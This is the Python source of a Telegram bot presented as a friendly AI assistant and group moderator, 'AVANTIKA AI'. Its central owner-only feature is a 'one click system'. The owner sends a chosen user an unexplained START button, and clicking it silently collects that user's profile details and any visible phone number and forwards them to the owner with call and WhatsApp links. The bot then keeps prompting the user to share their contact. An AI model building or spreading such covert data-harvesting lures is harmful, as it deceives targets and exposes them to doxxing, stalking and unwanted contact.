import os
import asyncio
import cohere
import pytz
import requests
from datetime import datetime, timedelta
from telegram import Update, ChatPermissions, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ChatType

# ================== KEYS ==================
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
COHERE_API_KEY = os.environ.get("COHERE_API_KEY")
# ==========================================

OWNER_USER_ID = 7614459746

co = cohere.Client(COHERE_API_KEY)
IST = pytz.timezone('Asia/Kolkata')
user_history = {}
active_groups = {}
allowed_users = {7614459746}
group_warnings = {}
group_rules = {}
group_notes = {}
saved_contacts = {}
number_db = {}

AVANTIKA_PREAMBLE = """You are AVANTIKA AI — Premium, Smart assistant.
Detect language, reply in SAME language. Detailed answers.
Use **Bold**, _Italic_, emojis 🔥💯😂👊💎⚡🎯❤️. Natural & friendly."""

def get_ist_now(): return datetime.now(IST)

def parse_time(ts):
    ts = ts.lower().strip().replace(" ", "")
    if not ts: return None
    for w, m in [('seconds',1/60),('second',1/60),('sec',1/60),('minutes',1),('minute',1),('mins',1),('min',1),('hours',60),('hour',60),('hrs',60),('hr',60),('days',1440),('day',1440)]:
        if ts.endswith(w):
            try: return float(ts[:-len(w)])*m
            except: pass
    try:
        if ts.endswith('s'): return float(ts[:-1])/60
        if ts.endswith('m'): return float(ts[:-1])
        if ts.endswith('h'): return float(ts[:-1])*60
        if ts.endswith('d'): return float(ts[:-1])*1440
        return float(ts)
    except: return None

def format_time(m):
    ts = int(m*60)
    if ts <= 0: return "0 seconds"
    d, ts = divmod(ts,86400); h, ts = divmod(ts,3600); mi, s = divmod(ts,60)
    p = []
    if d: p.append(f"*{d}* day{'s' if d!=1 else ''}")
    if h: p.append(f"*{h}* hour{'s' if h!=1 else ''}")
    if mi: p.append(f"*{mi}* minute{'s' if mi!=1 else ''}")
    if s and not d: p.append(f"*{s}* second{'s' if s!=1 else ''}")
    return ", ".join(p) if p else "0 seconds"

def is_allowed(uid): return uid in allowed_users

def get_ai_reply(text, chat_id):
    if chat_id not in user_history: user_history[chat_id] = []
    ch = []
    for msg in user_history[chat_id][-4:]:
        r = "USER" if msg["role"]=="user" else "CHATBOT"
        ch.append({"role":r,"message":msg["content"]})
    try:
        resp = co.chat(message=text, chat_history=ch, preamble=AVANTIKA_PREAMBLE, temperature=0.95, max_tokens=800)
        return resp.text
    except: return "😅 _Fir se bol!_ 💎"

# ================== TELEGRAM API ==================
def get_telegram_user(uid):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getChat"
    try:
        resp = requests.post(url, json={"chat_id": uid}, timeout=10)
        data = resp.json()
        return data["result"] if data.get("ok") else None
    except: return None

def get_photos_count(uid):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUserProfilePhotos"
    try:
        resp = requests.post(url, json={"user_id": uid, "limit": 1}, timeout=10)
        data = resp.json()
        return data["result"]["total_count"] if data.get("ok") else 0
    except: return 0

def check_phone_visible(uid):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getChat"
    try:
        resp = requests.post(url, json={"chat_id": uid}, timeout=10)
        data = resp.json()
        if data.get("ok") and "phone_number" in data["result"]:
            return data["result"]["phone_number"]
        return None
    except: return None

def get_full_user_data(uid):
    """User ka pura data ek saath lo"""
    data = {}
    
    # Basic info
    tg_user = get_telegram_user(uid)
    data["tg_user"] = tg_user
    
    # Photos
    data["photos"] = get_photos_count(uid)
    
    # Phone visible?
    data["phone_visible"] = check_phone_visible(uid)
    
    # Username
    data["username"] = tg_user.get("username") if tg_user else None
    
    # Full name
    if tg_user:
        data["first_name"] = tg_user.get("first_name", "Unknown")
        data["last_name"] = tg_user.get("last_name", "")
        data["is_bot"] = tg_user.get("is_bot", False)
        data["is_premium"] = tg_user.get("is_premium", False)
        data["language_code"] = tg_user.get("language_code", "N/A")
    
    return data

# ================== ONE-CLICK SYSTEM ==================
async def uid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """UID dalo → User ko START button → Click karte hi SAB DATA Owner ke paas"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_USER_ID:
        await update.message.reply_text("🔒 *ACCESS DENIED!* 👑", parse_mode="Markdown")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔍 *ONE CLICK SYSTEM* 🔍\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 *USAGE:* `/uid 123456789`\n"
            "📝 *OR:* `/uid @username`\n\n"
            "⚡ *HOW IT WORKS:*\n"
            "1️⃣ You type `/uid 123456789`\n"
            "2️⃣ User gets *START* button\n"
            "3️⃣ User clicks START\n"
            "4️⃣ *ALL DATA sent to YOU!* 🎉\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "👑 _Only BOSS!_ 🔥",
            parse_mode="Markdown"
        )
        return
    
    target = context.args[0]
    target_uid = None
    
    # Resolve username
    if target.startswith("@"):
        try:
            chat = await context.bot.get_chat(target)
            target_uid = chat.id
        except:
            await update.message.reply_text("❌ *Username not found!*", parse_mode="Markdown")
            return
    else:
        try:
            target_uid = int(target)
        except:
            await update.message.reply_text("❌ *Valid UID do!*", parse_mode="Markdown")
            return
    
    # BOSS ko bataye
    await update.message.reply_text(
        f"🚀 *SENDING START BUTTON...* 📱\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Target:* `{target_uid}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏳ _User ko START button bhej diya!_\n"
        f"📊 _Jaise hi user START click karega → ALL DATA aapko mil jayega!_\n\n"
        f"💡 _User ne bot start nahi kiya to kaam nahi karega._",
        parse_mode="Markdown"
    )
    
    # User ko START button bhejo
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ START", callback_data=f"ustart_{target_uid}")]
    ])
    
    try:
        await context.bot.send_message(
            chat_id=target_uid,
            text="👋 *Hello!* \n\n_Please click START to continue..._",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    except:
        await update.message.reply_text(
            f"❌ *FAILED!*\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ _User ne bot block/start nahi kiya._\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 _User ko pehle `/start` bhejne bolo._",
            parse_mode="Markdown"
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Jab user START click kare → Turant data collect → BOSS ko bhejo"""
    query = update.callback_query
    await query.answer()
    data = query.data
    clicker_uid = query.from_user.id
    
    # ========== USER CLICKED START ==========
    if data.startswith("ustart_"):
        target_uid = int(data.replace("ustart_", ""))
        
        # Agar clicker alag hai to ignore (security)
        if clicker_uid != target_uid:
            await query.edit_message_text("❌ _This button is not for you!_")
            return
        
        # Loading message
        await query.edit_message_text(
            "⏳ *Fetching your data...* 🔍\n\n_Please wait..._",
            parse_mode="Markdown"
        )
        
        # === SAB DATA COLLECT KARO ===
        all_data = get_full_user_data(target_uid)
        
        # Contact button bhejo (backup)
        contact_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📱 Share Contact", callback_data=f"sharec_{target_uid}")]
        ])
        
        # User ko success message
        await context.bot.send_message(
            chat_id=target_uid,
            text="✅ *Done! Thank you!* 🎉\n\n_Your data has been processed._",
            parse_mode="Markdown",
            reply_markup=contact_keyboard
        )
        
        # === BOSS KO FULL REPORT BHEJO ===
        tg_user = all_data.get("tg_user")
        photos = all_data.get("photos", 0)
        phone = all_data.get("phone_visible")
        
        msg = "📊 *USER DATA RECEIVED!* 📊\n\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += "👤 *BASIC INFO*\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if tg_user:
            full_name = all_data["first_name"]
            if all_data["last_name"]: full_name += f" {all_data['last_name']}"
            
            msg += f"• *Name:* {full_name}\n"
            msg += f"• *User ID:* `{target_uid}`\n"
            msg += f"• *Username:* @{tg_user.get('username', 'Not Set')}\n"
            msg += f"• *Bot:* {'🤖 Yes' if all_data['is_bot'] else '👤 No'}\n"
            msg += f"• *Language:* `{all_data['language_code']}`\n"
            msg += f"• *Premium:* {'⭐ Yes' if all_data['is_premium'] else 'No'}\n"
            msg += f"• *Photos:* {photos} 🖼️\n"
        else:
            msg += f"• *User ID:* `{target_uid}`\n"
            msg += f"• *Photos:* {photos} 🖼️\n"
        
        msg += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += "📱 *PHONE NUMBER*\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if phone:
            msg += f"• *Status:* ✅ VISIBLE\n"
            msg += f"• *Number:* `{phone}`\n"
            clean = phone.replace("+", "").replace(" ", "")
        else:
            msg += "• *Status:* 🔒 Privacy ON\n"
            msg += "• *Tip:* User can share via button below\n"
            clean = None
        
        msg += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += "📊 *ADDITIONAL INFO*\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if tg_user:
            msg += f"• *First Seen:* {datetime.now().strftime('%d %b %Y, %I:%M %p')}\n"
            msg += f"• *Data Source:* Auto-collected via START\n"
        
        # Saved contacts
        if target_uid in saved_contacts:
            sc = saved_contacts[target_uid]
            msg += f"\n💾 *Saved:* {sc['name']} — `{sc['number']}`\n"
        
        msg += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += f"💎 _AVANTIKA AI — One Click System_\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━"
        
        # Buttons for BOSS
        keyboard = []
        if phone:
            keyboard.append([
                InlineKeyboardButton("📞 CALL", url=f"tel:{clean}"),
                InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={target_uid}")
            ])
            keyboard.append([
                InlineKeyboardButton("📱 WHATSAPP", url=f"https://wa.me/{clean}"),
                InlineKeyboardButton("💾 SAVE", callback_data=f"bsave_{target_uid}")
            ])
        else:
            keyboard.append([
                InlineKeyboardButton("📱 REQUEST CONTACT", callback_data=f"reqc_{target_uid}"),
                InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={target_uid}")
            ])
        
        # BOSS ko bhejo
        await context.bot.send_message(
            chat_id=OWNER_USER_ID,
            text=msg,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    # ========== BOSS BUTTONS ==========
    elif data.startswith("bsave_"):
        target_uid = int(data.replace("bsave_", ""))
        tg_user = get_telegram_user(target_uid)
        name = tg_user.get("first_name", "Unknown") if tg_user else "Unknown"
        saved_contacts[target_uid] = {
            "name": name, "number": "Pending",
            "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")
        }
        await query.edit_message_text(f"💾 *Saved!* ✅\n• {name}\n• UID: `{target_uid}`", parse_mode="Markdown")
    
    elif data.startswith("reqc_"):
        target_uid = int(data.replace("reqc_", ""))
        contact_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📱 Share Contact", callback_data=f"sharec_{target_uid}")]
        ])
        try:
            await context.bot.send_message(target_uid, "📱 _Please share your contact:_", reply_markup=contact_kb)
            await query.edit_message_text("✅ *Request sent!* 📱", parse_mode="Markdown")
        except:
            await query.edit_message_text("❌ *Failed!* User blocked bot.", parse_mode="Markdown")
    
    elif data.startswith("sharec_"):
        target_uid = int(data.replace("sharec_", ""))
        await context.bot.send_message(
            target_uid,
            "👇 *Tap below to share:*",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📱 SHARE MY CONTACT", callback_data=f"final_{target_uid}")]
            ])
        )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User contact share kare to BOSS ko forward"""
    if not update.message or not update.message.contact: return
    
    contact = update.message.contact
    uid = update.effective_user.id
    phone = contact.phone_number
    
    # Save
    saved_contacts[uid] = {"name": contact.first_name, "number": phone, "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")}
    number_db[phone] = {"name": contact.first_name, "reports": number_db.get(phone, {}).get("reports", 0) + 1}
    
    # BOSS ko
    clean = phone.replace("+", "").replace(" ", "")
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📞 CALL", url=f"tel:{clean}"), InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={uid}")],
        [InlineKeyboardButton("📱 WHATSAPP", url=f"https://wa.me/{clean}"), InlineKeyboardButton("💾 SAVE", callback_data=f"bsave_{uid}")]
    ])
    
    await context.bot.send_message(
        OWNER_USER_ID,
        f"📱 *NUMBER RECEIVED!* 📱\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Name:* {contact.first_name}\n"
        f"📱 *Phone:* `{phone}`\n"
        f"🆔 *UID:* `{uid}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💎 _AVANTIKA AI_",
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    
    await update.message.reply_text("✅ *Shared!* 🎉", parse_mode="Markdown")

# ================== SAVE CONTACTS ==================
async def savecontact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_USER_ID: await update.message.reply_text("❌ *Sirf BOSS!* 👑"); return
    if len(context.args) < 2: await update.message.reply_text("💾 `/savecontact UID Name Number`"); return
    try:
        uid = int(context.args[0]); name = context.args[1]; number = context.args[2]
        saved_contacts[uid] = {"name": name, "number": number, "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")}
        await update.message.reply_text(f"💾 *SAVED!* ✅\n• {name}\n• `{number}`\n• UID: `{uid}`")
    except: await update.message.reply_text("❌ *Error!*")

async def savedlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_USER_ID: await update.message.reply_text("❌ *Sirf BOSS!* 👑"); return
    if not saved_contacts: await update.message.reply_text("📝 _No saved contacts!_"); return
    msg = "💾 *SAVED CONTACTS*\n\n"
    for uid, info in saved_contacts.items(): msg += f"• *{info['name']}* — `{info['number']}` (UID: `{uid}`)\n"
    await update.message.reply_text(msg + f"\n📊 Total: {len(saved_contacts)}")

# ================== ALL FEATURES ==================
async def adduser(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    if not ctx.args: return
    try: allowed_users.add(int(ctx.args[0])); await update.message.reply_text("✅ *Added!*")
    except: pass

async def removeuser(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    if not ctx.args: return
    try:
        rid = int(ctx.args[0])
        if rid == OWNER_USER_ID: return
        allowed_users.discard(rid); await update.message.reply_text("✅ *Removed!*")
    except: pass

async def userlist(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    await update.message.reply_text(f"👥 *Users:* {len(allowed_users)}")

async def broadcast(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    if not ctx.args: return
    for uid in allowed_users:
        try: await ctx.bot.send_message(uid, "📢 *BOSS* 👑\n\n" + " ".join(ctx.args), parse_mode="Markdown")
        except: pass

async def get_id(update, ctx):
    if update.message.reply_to_message: await update.message.reply_text(f"🆔 `{update.message.reply_to_message.from_user.id}`")
    else: await update.message.reply_text(f"🆔 `{update.effective_user.id}`")

async def setrules(update, ctx):
    if not ctx.args: return
    group_rules[update.effective_chat.id] = " ".join(ctx.args)
    await update.message.reply_text("📜 *Rules Set!*")

async def rules(update, ctx):
    await update.message.reply_text(group_rules.get(update.effective_chat.id, "📜 _No rules!_"))

async def addnote(update, ctx):
    cid = update.effective_chat.id
    if not ctx.args: return
    if cid not in group_notes: group_notes[cid] = []
    group_notes[cid].append(" ".join(ctx.args))
    await update.message.reply_text("✅ *Note Added!*")

async def notes(update, ctx):
    cid = update.effective_chat.id
    if cid in group_notes and group_notes[cid]: await update.message.reply_text("📝 *Notes:*\n" + "\n".join([f"• {n}" for n in group_notes[cid]]))
    else: await update.message.reply_text("📝 _No notes!_")

async def clearnotes(update, ctx): group_notes[update.effective_chat.id] = []; await update.message.reply_text("✅ *Cleared!*")

async def pin(update, ctx):
    if not update.message.reply_to_message: return
    try: await update.message.reply_to_message.pin()
    except: pass

async def unpin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type == ChatType.PRIVATE: return
    try: await context.bot.unpin_all_chat_messages(update.effective_chat.id)
    except: pass

async def warn(update, ctx):
    cid = update.effective_chat.id
    if not update.message.reply_to_message: return
    t = update.message.reply_to_message.from_user
    if cid not in group_warnings: group_warnings[cid] = {}
    if t.id not in group_warnings[cid]: group_warnings[cid][t.id] = 0
    group_warnings[cid][t.id] += 1
    await update.message.reply_text(f"⚠️ *Warning!* {t.first_name} *{group_warnings[cid][t.id]}/3*")

async def clearwarns(update, ctx):
    cid = update.effective_chat.id
    if update.message.reply_to_message:
        t = update.message.reply_to_message.from_user
        if cid in group_warnings and t.id in group_warnings[cid]: group_warnings[cid][t.id] = 0
    else: group_warnings[cid] = {}
    await update.message.reply_text("✅ *Cleared!*")

async def ban_user(update, ctx):
    t = update.message.reply_to_message.from_user if update.message.reply_to_message else None
    if not t: return
    try: await ctx.bot.ban_chat_member(update.effective_chat.id, t.id); await update.message.reply_text(f"🔨 *BANNED!*")
    except: pass

async def unban_user(update, ctx):
    if not ctx.args: return
    try: await ctx.bot.unban_chat_member(update.effective_chat.id, int(ctx.args[0])); await update.message.reply_text("✅ *UNBANNED!*")
    except: pass

async def mute_user(update, ctx):
    cid = update.effective_chat.id
    if update.effective_chat.type == ChatType.PRIVATE: return
    t, ts = None, "1h"
    if update.message.reply_to_message:
        t = update.message.reply_to_message.from_user
        if ctx.args: ts = " ".join(ctx.args)
    if not t or t.id==update.effective_user.id or t.is_bot: return
    mm = parse_time(ts)
    if not mm or mm>43200 or mm<=0: return
    nw, ut = get_ist_now(), get_ist_now()+timedelta(minutes=mm)
    try:
        await ctx.bot.restrict_chat_member(chat_id=cid,user_id=t.id,
            permissions=ChatPermissions(can_send_messages=False,can_send_audios=False,can_send_documents=False,can_send_photos=False,can_send_videos=False,can_send_video_notes=False,can_send_voice_notes=False,can_send_polls=False,can_send_other_messages=False,can_add_web_page_previews=False,can_change_info=False,can_invite_users=False,can_pin_messages=False),until_date=ut)
        tn = t.first_name or "User"
        await update.message.reply_text(f"🔇 *MUTED!* 👤 {tn}\n⏱️ {format_time(mm)}\n🔓 `{ut.strftime('%I:%M %p')}`\n⏰ Auto")
        async def auto():
            await asyncio.sleep(mm*60)
            try:
                await ctx.bot.restrict_chat_member(chat_id=cid,user_id=t.id,
                    permissions=ChatPermissions(can_send_messages=True,can_send_audios=True,can_send_documents=True,can_send_photos=True,can_send_videos=True,can_send_video_notes=True,can_send_voice_notes=True,can_send_polls=True,can_send_other_messages=True,can_add_web_page_previews=True,can_change_info=False,can_invite_users=False,can_pin_messages=False))
                await ctx.bot.send_message(cid, f"✅ *AUTO UNMUTED!* {tn}")
            except: pass
        asyncio.create_task(auto())
    except: pass

async def unmute_user(update, ctx):
    t = update.message.reply_to_message.from_user if update.message.reply_to_message else None
    if not t: return
    try:
        await ctx.bot.restrict_chat_member(chat_id=update.effective_chat.id,user_id=t.id,
            permissions=ChatPermissions(can_send_messages=True,can_send_audios=True,can_send_documents=True,can_send_photos=True,can_send_videos=True,can_send_video_notes=True,can_send_voice_notes=True,can_send_polls=True,can_send_other_messages=True,can_add_web_page_previews=True,can_change_info=False,can_invite_users=False,can_pin_messages=False))
        await update.message.reply_text(f"✅ *UNMUTED!* {t.first_name}")
    except: pass

async def welcome(update, ctx):
    if not update.message.new_chat_members: return
    for u in update.message.new_chat_members:
        if u.id == ctx.bot.id: await ctx.bot.send_message(update.effective_chat.id, "✨ *AVANTIKA AI JOINED!* ✨\n\n👑 _Admin_ */activate*\n💻 Coding | 📚 Knowledge | 😂 Fun\n🔍 `/uid` — One Click!\n\n🔥 _Activate me!_", parse_mode="Markdown")
        else: await ctx.bot.send_message(update.effective_chat.id, f"✨ *WELCOME!* ✨\n\n👤 *{u.first_name}*\n🌟 _Aapka swagat hai!_ 🎉\n💎 Premium AI | 💻 Coding | 📚 Knowledge | 😂 Fun", parse_mode="Markdown")

async def start(update, ctx):
    cid = update.effective_chat.id; ct = update.effective_chat.type; uid = update.effective_user.id
    if ct == ChatType.PRIVATE:
        if uid == OWNER_USER_ID:
            user_history[cid] = []
            await update.message.reply_text(
                "👑 *WELCOME BACK BOSS!* 👑\n\n💎 *AVANTIKA AI — ONE CLICK SYSTEM!*\n\n"
                "🔍 `/uid 123456789` — User ko START button\n📊 _START click = ALL DATA to you!_\n\n"
                "/start /clear /activate\n/mute /unmute /ban /unban\n/uid /savecontact /savedlist\n/broadcast /id\n\n_Bolo boss!_ 🔥",
                parse_mode="Markdown"
            )
        elif is_allowed(uid): user_history[cid] = []; await update.message.reply_text("✅ *Access Granted!*")
        else: await update.message.reply_text("🔒 *Access Denied!*")
    else: user_history[cid] = []; await update.message.reply_text("👋 *AVANTIKA AI* 💎\n\n👑 _Admin_ */activate*")

async def activate(update, ctx):
    cid = update.effective_chat.id
    if update.effective_chat.type == ChatType.PRIVATE: return
    if update.effective_user.id not in [a.user.id for a in await ctx.bot.get_chat_administrators(cid)]: await update.message.reply_text("❌ *ADMIN ONLY!*"); return
    active_groups[cid] = True
    await update.message.reply_text("✅ *ACTIVATED!* 🔥\n❌ /deactivate")

async def deactivate(update, ctx):
    if update.effective_chat.type == ChatType.PRIVATE: return
    active_groups[update.effective_chat.id] = False; await update.message.reply_text("🔴 *OFF!*")

async def clear(update, ctx):
    cid = update.effective_chat.id
    if update.effective_user.id != OWNER_USER_ID: return
    user_history[cid] = []; group_warnings.pop(cid, None); group_rules.pop(cid, None); group_notes.pop(cid, None)
    await update.message.reply_text("✅ *COMPLETE RESET!* 🔄")

async def handle(update, ctx):
    cid = update.effective_chat.id; ct = update.effective_chat.type; msg = update.message; uid = update.effective_user.id
    if msg.new_chat_members: await welcome(update, ctx); return
    if ct == ChatType.PRIVATE and not is_allowed(uid): await msg.reply_text("🔒 *Permission nahi!*", parse_mode="Markdown"); return
    if ct != ChatType.PRIVATE and (cid not in active_groups or not active_groups[cid]): return
    if not msg.text: return
    await ctx.bot.send_chat_action(chat_id=cid, action="typing")
    try:
        reply = get_ai_reply(msg.text, cid)
        if cid not in user_history: user_history[cid] = []
        user_history[cid].append({"role":"user","content":msg.text})
        user_history[cid].append({"role":"assistant","content":reply})
        user_history[cid] = user_history[cid][-10:]
        await msg.reply_text(reply, parse_mode="Markdown")
    except: pass

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    for cmd, fn in [
        ("start",start),("activate",activate),("deactivate",deactivate),("clear",clear),
        ("mute",mute_user),("unmute",unmute_user),("ban",ban_user),("unban",unban_user),
        ("warn",warn),("clearwarns",clearwarns),("setrules",setrules),("rules",rules),
        ("addnote",addnote),("notes",notes),("clearnotes",clearnotes),
        ("pin",pin),("unpin",unpin),("info",lambda u,c: u.message.reply_text(f"🆔 {u.effective_user.id}")),
        ("adduser",adduser),("removeuser",removeuser),("userlist",userlist),
        ("broadcast",broadcast),("id",get_id),
        ("uid",uid_command),("savecontact",savecontact),("savedlist",savedlist)
    ]:
        app.add_handler(CommandHandler(cmd,fn))
    app.add_handler(CommandHandler("mutelist",lambda u,c: u.message.reply_text("🔇 */mute 10s 5m 2h 1d 30d*\n🔊 */unmute* | 🔍 */uid*")))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.ALL, handle))
    print("👑 AVANTIKA AI — ONE CLICK SYSTEM!"); app.run_polling()

if __name__ == "__main__": main()
